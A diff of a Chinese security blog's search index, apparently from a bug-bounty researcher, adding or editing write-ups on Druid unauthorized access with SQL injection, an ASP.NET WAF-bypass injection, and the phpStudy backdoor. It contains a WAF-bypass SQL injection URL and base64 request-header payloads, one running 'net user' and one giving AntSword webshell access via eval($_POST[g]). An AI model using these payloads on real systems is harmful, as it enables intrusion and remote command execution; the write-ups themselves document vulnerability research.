@@ -1,6 +1,37 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Druid未授权(某接口敏感信息泄漏导致sql注入)</title>
+    <url>/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/1.png" alt="1.png"></p>
+<a id="more"></a>
+
+<p>这个页面一看就是spring-boot框架<br>这里用工具尝试了下看能不能找到未授权访问,这里工具本来不支持检测这个项目由于之前我改了下,这次派上用场<br><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/2.png" alt="2.png"><br>这里存在swagger和druid未授权访问但是swagger无法访问<br>就只能看看druid,由于有的Druid可能Session监控处没有东西比如这个站，可以通过URI监控测试未授权越权或者接口敏感信息泄漏或者注入.<br><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/3.png" alt="3.png"><br>但是这里通过druid一个接口找到了敏感信息泄漏.<br><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/4.png" alt="4.png"><br><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/5.png" alt="5.png"><br>一般存在接口这些sql注入测试必不可少的,果不其然在参数为search找到注入<br><img data-src="/2020/07/16/Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9F%90%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4sql%E6%B3%A8%E5%85%A5/6.png" alt="6.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>asp.net环境bypass waf注入</title>
+    <url>/2020/07/15/%E5%B8%B8%E8%A7%84iis%E7%8E%AF%E5%A2%83bypass%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p><img data-src="/2020/07/15/%E5%B8%B8%E8%A7%84iis%E7%8E%AF%E5%A2%83bypass%E6%B3%A8%E5%85%A5/2.png" alt="2.png"></p>
+<a id="more"></a>
+<p>在这里感谢f0ng师傅给的教材</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/Ardsadaxxx.asp?menu2=<span class="number">149</span><span class="keyword">and</span><span class="comment">/*&amp;menu2=*/</span><span class="built_in">len</span><span class="comment">/**/</span>%<span class="number">0</span><span class="keyword">a</span><span class="comment">--+aaaaa%0a(db_name%0a--+aaaa%0a())=13</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/2020/07/15/%E5%B8%B8%E8%A7%84iis%E7%8E%AF%E5%A2%83bypass%E6%B3%A8%E5%85%A5/1.png" alt="1.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞挖掘</category>
+      </categories>
+      <tags>
+        <tag>SRC</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记一次帮朋友面试代码审计</title>
     <url>/2020/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B8%AE%E6%9C%8B%E5%8F%8B%E9%9D%A2%E8%AF%95%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
     <content><![CDATA[<p><img data-src="/2020/07/13/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%B8%AE%E6%9C%8B%E5%8F%8B%E9%9D%A2%E8%AF%95%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" alt="1.png"></p>
@@ -156,9 +187,10 @@
   <entry>
     <title>SRC接口注入到伪造登录</title>
     <url>/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/</url>
-    <content><![CDATA[<a id="more"></a>
-<p>是不是看到这种统一身份认证中心是不是感觉无从下手.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/2.png" alt="2.png"></p>
-<p>这里接口从js里面找到,其实我后面扫了下目录发现也可以找到.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/1.png" alt="1.png"></p>
+    <content><![CDATA[<p><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/2.png" alt="2.png"></p>
+<a id="more"></a>
+
+<p>开局登录框,漏洞全靠爆.<br>这里接口从js里面找到,其实我后面扫了下目录发现也可以找到.<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/1.png" alt="1.png"></p>
 <p>由于这里漏洞被修复就没办法截图了,漏洞报告里面看不清楚,就只能描述下,这里毫无防护直接丢进sqlmap跑<br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/3.png" alt="3.png"><br><img data-src="/2020/06/15/SRC%E6%8E%A5%E5%8F%A3%E6%B3%A8%E5%85%A5%E5%88%B0%E4%BC%AA%E9%80%A0%E7%99%BB%E5%BD%95/4.png" alt="4.png"></p>
 <p>由于我询问了下审核人员这里能否深入,他说到表就行了,只能放弃从注入登录后台<br>在这个测出注入前我发现这个站是spring boot框架,测试发现存在Spring Boot Actuator未授权访问<br>这里简单讲下Springboot的actuator配置</p>
 <p>/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过<br>/configprops    描述配置属性（包含默认值）如何注入 Bean<br>/beans    描述应用程序上下文里全部的 Bean，以及它们的关系<br>/dump    获取线程活动的快照<br>/env    获取全部环境属性<br>/env/{name}    根据名称获取特定的环境属性值<br>/health    报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供<br>/info    获取应用程序的定制信息，这些信息由 info 打头的属性提供<br>/mappings    描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系<br>/metrics    报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数<br>/metrics/{name}    报告指定名称的应用程序度量值<br>post    /shutdown    关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）<br>/trace    提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）<br>/auditevents    显示应用暴露的审计事件 (比如认证进入、订单失败)<br>/loggers    显示和修改配置的loggers<br>/flyway    显示数据库迁移路径的详细信息<br>/liquidbase    显示Liquibase 数据库迁移的纤细信息<br>/scheduledtasks    显示应用中的调度任务<br>/threaddump    执行一个线程dump<br>/heapdump    返回一个GZip压缩的JVM堆dump<br>/logfile    返回log file中的内容(如果logging.file或者logging.path被设置)</p>
@@ -451,7 +483,7 @@
 <a id="more"></a>
 <h2 id="后门验证"><a href="#后门验证" class="headerlink" title="后门验证"></a>后门验证</h2><p>用记事本或者Notepad++打开phpstudy安装目录下的：</p>
 <p>PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll<br>存在@eval(%s(‘%s’));即说明有后门。<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/4.png" alt="4.png"></p>
-<h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>访问ip地址用burp抓包<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png" alt="1.png"><br>在请求头里构造 Accept-Encoding 和 accept-charset 即可。<br>Accept-Encoding 已经有了，但是这里注意：<br>要把gzip, deflate 里gzip逗号后面的空格去掉，不然命令执行不成功。<br>然后在请求头里添加 accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Charset 的值就是行的命令，默认是system(‘net user’);<br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png" alt="6.png"><br>如果后续有时间，尽快能会写个批量扫描后门脚本</p>
+<h2 id="后门复现"><a href="#后门复现" class="headerlink" title="后门复现"></a>后门复现</h2><p>访问ip地址用burp抓包<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/1.png" alt="1.png"><br>在请求头里构造 Accept-Encoding 和 accept-charset 即可。<br>Accept-Encoding 已经有了，但是这里注意：<br>要把gzip, deflate 里gzip逗号后面的空格去掉，不然命令执行不成功。<br>然后在请求头里添加 accept-charset: c3lzdGVtKCduZXQgdXNlcicpOw==<br>Accept-Charset 的值就是行的命令，默认是system(‘net user’);<br>如果想要执行其他命令，直接去把命令进行base64编码替换即可！<br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/6.png" alt="6.png"><br>如果后续有时间，尽快能会写个批量扫描后门脚本<br>这里给上蚁剑直接连接getshell配置<br>Value值 base64解码密码为g<br> <figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">HTTP</span> <span class="string">HEADERS</span></span><br><span class="line"><span class="attr">Name</span>:  <span class="string">Accept-Charset</span></span><br><span class="line"><span class="attr">Value</span>: <span class="string">ZXZhbCgkX1BPU1RbZ10pOw==</span></span><br><span class="line"></span><br><span class="line"><span class="attr">HTTP</span> <span class="string">BODY</span></span><br><span class="line"><span class="attr">Name</span>: <span class="string">Accept-Encoding</span></span><br><span class="line"><span class="attr">Value</span>:  <span class="string">gzip,deflate</span></span><br></pre></td></tr></table></figure><br><img data-src="/2019/11/06/phpstduy%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/5.png" alt="5.png"></p>
 <p>此文章参考了<a href="https://dylan903.coding.me/2019/09/23/phpstudy-hou-men-lou-dong-fu-xian/" target="_blank" rel="noopener">dylan’s blog</a></p>
 ]]></content>
       <categories>
